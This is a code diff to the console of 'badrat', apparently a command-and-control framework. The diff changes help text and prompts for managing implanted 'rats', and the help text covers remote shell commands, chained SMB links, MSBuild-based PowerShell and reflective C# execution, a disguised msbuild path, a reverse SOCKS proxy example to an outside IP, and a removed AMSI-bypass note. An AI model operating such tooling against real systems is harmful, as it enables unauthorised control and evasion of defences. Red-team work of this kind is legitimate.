@@ -62,7 +62,6 @@ notes = {}
 upstream = {}
 links = {}
 
-
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
     def __init__(self):
@@ -665,9 +664,9 @@ def get_rats(current=""):
     pretty_print("    ----------\t----\t--------   --------\t--------               \t----------     \t--------\t-----")
     for ratID, checkin in rats.items():
         if(current == ratID or current == "all"):
-            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}   {:<10}\t{:<20}\t{:<15}\t{:<15}\t{:<15}".format(colors(">>"), ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
+            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}   {:<10}\t{:<20}\t{:<15}\t{:<15}\t{:<15}".format(colors(">>"), colors(ratID), colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
         else:
-            pretty_print("    {:<10}\t{:<4}\t{:<8}   {:<10}\t{:<20}\t{:<15}\t{:<15}\t{:<6}".format(ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
+            pretty_print("    {:<10}\t{:<4}\t{:<8}   {:<10}\t{:<20}\t{:<15}\t{:<15}\t{:<6}".format(colors(ratID), colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
         if(ratID in notes.keys() and notes[ratID] != ""):
             pretty_print("      L..:>> " + notes[ratID])
     pretty_print("")
@@ -695,15 +694,18 @@ def get_help():
     pretty_print("")
     pretty_print("Server commands: -- commands to control the badrat server")
     pretty_print("help -- it's this help page, duh")
-    pretty_print("rats/agents/sessions -- gets the list of rats and their last checkin time")
+    pretty_print("rats -- gets the list of rats and their last checkin time")
     pretty_print("exit -- exits the badrat console and shuts down the listener")
     pretty_print("<ratID> -- start interacting with the specified rat")
     pretty_print("all -- start interacting with ALL rats")
     pretty_print("back -- backgrounds the current rat and goes to the main menu")
-    pretty_print("remove all -- unregisters ALL rats")
     pretty_print("remove <ratID> -- unregisters the specified <ratID>")
+    pretty_print("remove all -- unregisters ALL rats")
     pretty_print("clear -- clear all rat command queues (useful for stopping accidental commands)")
     pretty_print("note -- add a note to a rat")
+    pretty_print("set-msbuild-path -- Sets an alternate path for msbuild. Affects all rats (global scope)")
+    pretty_print("example: set-msbuild-path C:\\windows\\temp\\definitely-not-msbuild.exe")
+    pretty_print("example: set-msbuild-path default")
     pretty_print("")
     pretty_print("Rat commands: -- commands to interact with a badrat rat")
     pretty_print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on rat type")
@@ -713,6 +715,7 @@ def get_help():
     pretty_print("spawn -- used to spawn a new rat in a new process. (doesn't work with SMB rats, don't even try...)")
     pretty_print("link -- tells the current rat to link to a child rat given a local file or UNC path")
     pretty_print("example: link \\\\Server01\\Public\\link.txt")
+    pretty_print("unlink -- tells the current rat to disconnect from a child rat given a local file or UNC path")
     pretty_print("psh <local_powershell_script_path> <extra powershell commands> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
     pretty_print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
     pretty_print("csharp <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
@@ -733,8 +736,8 @@ def get_help():
     pretty_print("Some rats need to write to disk for execution or cmd output. Every rat that must write to disk cleans up files created.")
     pretty_print("By default, rat communications are NOT SECURE. Do not send sensitive info through the C2 channel unless using SSL")
     pretty_print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe")
-    pretty_print("Tal Liberman's AMSI Bypass is included by default for msbuild psh execution (js and hta ONLY). This may not be desireable and can be turned off by changing the variable at the beginning of this script")
-    pretty_print("All assemblies run with \"csharp\" must be compiled with a public Main method and a public class that contains Main\n")
+    pretty_print("All assemblies run with \"csharp\" must be compiled with a public Main method and a public class that contains Main")
+    pretty_print("The longer the chain of rats, the longer it takes for a send/receive round trip. Formula = (2 * n * d) where n = number of rats in the chain, and d = delay/sleep time.\n")
 
 if __name__ == "__main__":
     # Start the Flask server
@@ -763,7 +766,7 @@ if __name__ == "__main__":
                 sys.exit()
 
             # Gets the help info
-            elif(inp == "help"):
+            elif(str.startswith(inp, "help")):
                 get_help()
 
             # Set the msbuild path
@@ -803,10 +806,13 @@ if __name__ == "__main__":
             # Enter rat specific command prompt
             elif(inp in rats.keys() or inp == "all"):
                 ratID = inp
+                if(ratID != "all" and upstream[ratID] != "<direct>"):
+                    prompt = colors(str(upstream[ratID])) + " <-- " + colors(ratID) + " \\\\> "
+                else:
+                    prompt = colors(ratID) + " \\\\> "
 
                 # Interact-with-rat loop
                 while True:
-                    prompt = colors(ratID) + " \\\\> "
                     inp = input(prompt)
                     log_console(prompt + inp)
 
@@ -825,7 +831,7 @@ if __name__ == "__main__":
                             pretty_print("[*] Cleared all rat command queues!")
                             continue
 
-                        elif(inp == "help"):
+                        elif(str.startswith(inp, "help")):
                             get_help()
                             continue
 
